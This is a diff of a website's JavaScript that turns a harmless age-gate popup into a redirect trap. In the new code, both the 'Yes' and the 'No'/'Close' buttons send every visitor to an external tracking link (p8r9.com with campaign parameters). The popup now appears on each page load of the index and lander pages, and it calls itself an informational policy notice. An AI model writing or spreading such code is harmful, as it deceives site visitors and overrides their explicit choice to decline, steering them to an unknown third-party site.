@@ -1,4 +1,3 @@
-
 // Mobile nav toggle
 const navToggle = document.querySelector('[data-nav-toggle]');
 const navMenu = document.querySelector('[data-nav-menu]');
@@ -34,14 +33,12 @@ if(form){
   });
 }
  
-// Age-gate: show ONLY on home page (index.html or root) and once per session.
-// Closes on Yes/No and stays on the page.
+// Age-gate popup for index.html and lander.html
 (function(){
   const path = window.location.pathname;
-  const isHome = /(^\/$|index\.html$)/.test(path);
-  if(!isHome) return;
-  if(sessionStorage.getItem('ageGateShown') === '1') return;
-  sessionStorage.setItem('ageGateShown', '1');
+  const isIndexOrLander = /(^\/$|index\.html$|lander\.html$)/.test(path);
+  if(!isIndexOrLander) return;
+  
   const bd = document.createElement('div');
   bd.className = 'modal-backdrop';
   bd.innerHTML = `
@@ -55,37 +52,12 @@ if(form){
 </div>`;
   document.body.appendChild(bd);
   bd.style.display='flex';
-  function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click', closeGate);
-  bd.querySelector('#age-no').addEventListener('click', closeGate);
-})();
- 
-(function(){
-  const path = window.location.pathname;
-  const isHome = /(^\/$|lander\.html$)/.test(path);
-  if(!isHome) return;
-  if(sessionStorage.getItem('ageGateShown') === '1') return;
-  sessionStorage.setItem('ageGateShown', '1');
-  const bd = document.createElement('div');
-  bd.className = 'modal-backdrop';
-  bd.innerHTML = `
-<div class="modal">
-<h3>Policy Notice</h3>
-<p>Are you accepting our policy to play the game? This notice is informational and does not block access.</p>
-<div style="display:flex;gap:10px;flex-wrap:wrap">
-<button class="btn" id="age-yes">Yes, Accept</button>
-<button class="btn ghost" id="age-no">Close</button>
-</div>
-</div>`;
-  document.body.appendChild(bd);
-  bd.style.display='flex';
-  function closeGate(){ bd.style.display='none'; bd.remove(); }
-  bd.querySelector('#age-yes').addEventListener('click',
-                                                function(){
-   window.location.href = "http://p8r9.com/?utm_campaign=jDlsYkWoNb&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  
+  bd.querySelector('#age-yes').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=jDlsYkWoNb&v1=[v1]&v2=[v2]&v3=[v3]";
   });
-   bd.querySelector('#age-no').addEventListener('click', 
-                                               function(){
-   window.location.href = "http://p8r9.com/?utm_campaign=jDlsYkWoNb&v1=[v1]&v2=[v2]&v3=[v3]"; // change to your target page
+  
+  bd.querySelector('#age-no').addEventListener('click', function(){
+    window.location.href = "http://p8r9.com/?utm_campaign=jDlsYkWoNb&v1=[v1]&v2=[v2]&v3=[v3]";
   }); 
 })();
